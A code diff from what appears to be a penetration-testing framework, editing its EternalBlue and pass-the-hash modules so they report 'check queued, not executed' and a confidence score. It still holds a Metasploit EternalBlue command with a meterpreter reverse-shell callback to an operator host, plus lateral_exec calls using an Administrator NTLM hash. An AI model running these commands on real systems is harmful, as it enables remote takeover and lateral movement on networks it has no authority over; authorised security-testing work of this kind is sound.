@@ -75,10 +75,11 @@ class EternalBlue(AttackModule):
         return self._info_result(
             ctx,
             note=(
-                "SMBv1 MS17-010 RCE (CVE-2017-0144). Lands as SYSTEM by design. "
-                "Affects unpatched Win XP/7/Server 2003/2008/2008R2 only."
+                "SMBv1 MS17-010 RCE (CVE-2017-0144). Would land as SYSTEM if the "
+                "MSF module succeeds — this recipe only checks applicability, it "
+                "does not execute. Affects unpatched Win XP/7/Server 2003/2008/2008R2 only."
             ),
-            evidence=[f"EternalBlue (CVE-2017-0144) applicable to {ctx.target_ip}"],
+            evidence=[f"EternalBlue (CVE-2017-0144) check queued against {ctx.target_ip} (not executed)"],
             references=[
                 "https://nvd.nist.gov/vuln/detail/CVE-2017-0144",
                 "https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/",
@@ -87,8 +88,7 @@ class EternalBlue(AttackModule):
                 f"exploit/windows/smb/ms17_010_eternalblue RHOSTS={ctx.target_ip} "
                 f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
             ),
-            shell_type="meterpreter",
-            privilege_level="system",
+            confidence=0.4,
         )
 
 
@@ -202,20 +202,17 @@ class PassTheHash(AttackModule):
                 "runas /netonly. Prefer the lateral_exec MCP tool form which "
                 "wraps impacket with argv safety + allowlist gating."
             ),
-            evidence=[f"PtH candidates against {ctx.target_ip} (hash required)"],
+            evidence=[f"PtH recipe queued against {ctx.target_ip} (hash required, not executed)"],
             references=[
                 "https://www.thehacker.recipes/a-d/movement/ntlm/pth",
                 "https://github.com/fortra/impacket",
             ],
-            suggested_commands=[
-                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', username='Administrator', ntlm_hash='<NT_HASH>')",
-                f"lateral_exec(target_ip='{ctx.target_ip}', method='psexec', username='Administrator', ntlm_hash='<NT_HASH>')",
-                f"lateral_exec(target_ip='{ctx.target_ip}', method='smbexec', username='Administrator', ntlm_hash='<NT_HASH>')",
-                f"lateral_exec(target_ip='{ctx.target_ip}', method='atexec', username='Administrator', ntlm_hash='<NT_HASH>')",
-            ],
+            suggested_command=(
+                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', "
+                f"username='Administrator', ntlm_hash='<NT_HASH>')"
+            ),
             prerequisites=["NTLM hash (LM:NT format)", "SMB port 445 open", "admin share accessible"],
-            shell_type="cmd",
-            privilege_level="admin",
+            confidence=0.4,
         )
 
 
